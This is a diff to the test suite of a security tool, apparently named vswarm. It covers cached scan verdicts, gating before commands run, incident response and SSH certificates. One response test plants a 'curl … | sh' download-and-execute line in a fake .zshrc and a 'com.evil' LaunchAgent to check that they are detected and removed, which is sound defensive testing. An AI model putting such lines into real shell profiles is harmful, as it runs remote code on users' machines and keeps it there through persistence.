@@ -7,13 +7,23 @@ import { keyEncrypted, kubeUsers, secretNames } from "../src/sec/secrets";
 import { selftest } from "../src/sec/selftest";
 import { suspiciousLocation } from "../src/sec/collect/system";
 import { sshGate } from "../src/setup";
-import { verdictOf, type Finding } from "../src/sec/types";
+import { verdictOf, type Finding, type Scan, type Verdict } from "../src/sec/types";
 
 // Tests that need sh/zsh/bash, POSIX modes, symlinks, launchd/systemd or Unix paths do not run on Windows (phase 1);
 // test/windows.test.ts covers what vswarm does there.
 const WIN = process.platform === "win32";
 
 const f = (severity: Finding["severity"]): Finding => ({ id: severity, rule: "x", severity, title: severity, detail: [] });
+
+/** A last check as vswarm writes it, sealed with the key in that temp state folder (the CLI there reads the same key). */
+const sealedLast = (sec: string, verdict: string) => {
+  const prev = process.env.VSWARM_SEC_DIR;
+  process.env.VSWARM_SEC_DIR = sec;
+  return saveLast({ verdict: verdict as Verdict, findings: [], at: Date.now(), scan: {} as Scan }).finally(() => {
+    if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
+    else process.env.VSWARM_SEC_DIR = prev;
+  });
+};
 
 describe("detection", () => {
   test("selftest catches every planted case with no false alarms", async () => {
@@ -90,16 +100,17 @@ describe("gate", () => {
     const sec = mkdtempSync(join(tmpdir(), "vs-pre-"));
     const env = { ...process.env, VSWARM_SEC_DIR: sec, NO_COLOR: "1" };
     const cli = join(import.meta.dir, "../src/cli.ts");
-    const last = (verdict: string) => writeFileSync(join(sec, "last.json"), JSON.stringify({ verdict, findings: [], at: Date.now(), scan: {} }));
-    last("block");
+    // A last check vswarm itself wrote (sealed with the key in this temp state folder); a hand-written one is not reused.
+    const last = (verdict: string) => sealedLast(sec, verdict);
+    await last("block");
     let p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
     expect(await p.exited).toBe(3);
     expect(await new Response(p.stdout).text()).toBe("");
-    last("pass");
+    await last("pass");
     p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
     expect(await p.exited).toBe(0);
     expect((await new Response(p.stdout).text()).trim()).toBe("RAN");
-    last("warn");
+    await last("warn");
     p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--strict", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
     expect(await p.exited).toBe(2);
     // Options after --then belong to the command, even ones vswarm knows.
@@ -107,7 +118,7 @@ describe("gate", () => {
     expect(await p.exited).toBe(0);
     expect((await new Response(p.stdout).text()).trim()).toBe("--offline --json RAN");
     // An open incident blocks even with a passing cached verdict.
-    last("pass");
+    await last("pass");
     writeFileSync(join(sec, "lock"), JSON.stringify({ incident: "t", at: Date.now(), reason: "test" }));
     p = Bun.spawn([process.execPath, cli, "preflight", "--quiet", "--offline", "--then", "echo", "RAN"], { env, stdout: "pipe", stderr: "pipe" });
     expect(await p.exited).toBe(3);
@@ -122,7 +133,7 @@ import { run, type Ctx } from "../src/sec/ctx";
 import { check } from "../src/sec/engine";
 import { forBaseline, scan } from "../src/sec/scan";
 import { respond } from "../src/sec/respond";
-import { saveBaseline, loadLock } from "../src/sec/store";
+import { saveBaseline, saveLast, loadLock } from "../src/sec/store";
 
 describe("respond", () => {
   test.skipIf(WIN)("locks, keeps evidence with hashes, quarantines on yes, strips added lines, writes reports", async () => {
@@ -133,14 +144,14 @@ describe("respond", () => {
       mkdirSync(join(home, "Library/LaunchAgents"), { recursive: true });
       writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\n");
       const ctx: Ctx = { home, pathDirs: [], system: false, host: "t", user: "t", run: (cmd, t) => (cmd[0] === "plutil" ? run(cmd, t) : Promise.resolve(undefined)) };
-      saveBaseline(forBaseline(await scan(ctx, { live: false })));
+      await saveBaseline(forBaseline(await scan(ctx, { live: false })));
       writeFileSync(join(home, ".zshrc"), "alias ll='ls -la'\ncurl -s http://198.51.100.7/x | sh &\n");
       const plist = join(home, "Library/LaunchAgents/com.evil.plist");
       writeFileSync(plist, `<?xml version="1.0"?><plist version="1.0"><dict><key>Label</key><string>com.evil</string><key>ProgramArguments</key><array><string>${home}/.cache/x</string></array></dict></plist>`);
       const r = await check(ctx, { offline: true });
       expect(r.verdict).toBe("block");
       const inc = await respond(ctx, r, async () => true);
-      expect(loadLock()?.incident).toBe(inc.id);
+      expect((await loadLock())?.incident).toBe(inc.id);
       expect(existsSync(plist)).toBe(false);
       expect(readdirSync(join(inc.dir, "quarantine")).some((f) => f.endsWith("com.evil.plist"))).toBe(true);
       expect(readFileSync(join(home, ".zshrc"), "utf8")).toBe("alias ll='ls -la'\n");
@@ -257,13 +268,14 @@ describe("short-lived SSH certificates", () => {
       const p = Bun.spawn([process.execPath, cli, ...a], { env, stdin: "ignore", stdout: "pipe", stderr: "pipe" });
       return { code: await p.exited, err: await new Response(p.stderr).text() };
     };
-    const last = (verdict: string) => writeFileSync(join(sec, "last.json"), JSON.stringify({ verdict, findings: [], at: Date.now(), scan: {} }));
+    // A last check vswarm itself wrote (sealed with the key in this temp state folder); a hand-written one is not reused.
+    const last = (verdict: string) => sealedLast(sec, verdict);
     // A throwaway CA without a passphrase, for this test only.
     expect((await vs("ca", "init", "--no-passphrase", "--ttl", "5m")).code).toBe(0);
-    last("block");
+    await last("block");
     expect((await vs("cert", "--quiet")).code).toBe(3);
     expect(existsSync(join(ca, "session-cert.pub"))).toBe(false);
-    last("pass");
+    await last("pass");
     expect((await vs("cert")).code).toBe(0);
     expect(existsSync(join(ca, "session-cert.pub"))).toBe(true);
 
